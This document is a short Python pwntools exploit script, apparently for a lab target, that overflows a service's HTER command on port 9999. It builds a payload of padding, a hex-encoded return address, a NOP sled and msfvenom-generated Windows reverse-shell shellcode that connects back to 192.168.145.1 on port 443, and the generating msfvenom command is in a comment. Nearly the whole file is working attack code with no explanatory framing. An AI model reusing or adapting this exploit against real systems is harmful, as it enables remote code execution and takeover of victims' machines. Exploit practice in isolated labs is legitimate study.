#!/usr/bin/python3

from pwn import *

# target info
host = "192.168.145.129"
port = 9999

s = remote(host, port)


# phase 1: test offset
vulncmd = b"HTER "
cyclic_pattern = str.encode(cyclic(4000,"123456789ABCDEF")) # generate cyclic pattern as byte array

# phase 2 confirm EIP

crash = 4000
offset = 2047 -6 # -6 to correct EIP offset
junk = b"A" * offset
eip = b"BBBBBBBB" # 8 B's because app doesnt convert it into hex

# phase 3 exploit ;)

new_eip = binascii.hexlify(p32(0x625011AF)) # p32 for little endian, but convert to hex because the app doesnt do that
nop_sled = b"90"*32 # just some nops to slide into my shellcode

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.145.1 LPORT=443 -b "\x00" -f hex
shellcode = b"bdac833462dac3d97424f45829c9b15231681283e8fc03c48dd697e87a9458107bf9d1f54a39857efc89cdd2f16283c682070ce923ad6ac4b49e4f4737dd83a7062ed6a64f531bfa181f8eea2d5513817e7b1376367a32294c2594c8815d9dd2c65857693c1666bb0cd7c582a02a17c307d5623d746875fa06b6f018a03da2c45091358f5f5e31d74361966c7fea19a209a83d66516a5f3f3fdd605fe082c4140dd674775a1bb5879a33cef4a89c64928055a365e64f13f9197064d0dd24344af744df8af89070da564b318a163bd9c09864f9eb720d901615f2cd89e49a0fa9e7e1994f8d05ccd83abf5592db4040dfdccb6720923b0d3243cc5868c2d3760488461dd4c77a8a83804dc3413df77d77bc6145331b5248baeeee6eac36ee2a98e6b9e476411047201bcf01a4da2392b2e269645a52c431655b80b51e813039f50140705723c9dd027194ddf9b6a15d0b47567d7e421239933e0bac93ed2ce5"

# phase 2 payload
# payload = b"".join([
#     vulncmd,
#     cyclic_pattern
# ])quit

# phase 3 payload
payload = b"".join([
    vulncmd,
    junk,
    new_eip,
    nop_sled,
    shellcode
])

payload += b"C" * (crash - len(payload)) # padding

s.send(payload)
s.close()



